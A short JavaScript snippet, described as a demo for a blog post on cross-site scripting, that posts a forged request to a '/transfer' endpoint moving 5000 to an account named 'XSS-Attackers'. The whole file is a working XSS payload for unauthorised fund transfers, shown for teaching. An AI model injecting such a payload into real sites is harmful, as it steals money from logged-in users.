// Used for demo purposes. See https://angchenlab.com/blog/xss/
const body = new URLSearchParams('amount=5000&description=Gotcha!&to=XSS-Attackers');
fetch('/transfer', {
  body,
  method: 'post',
});
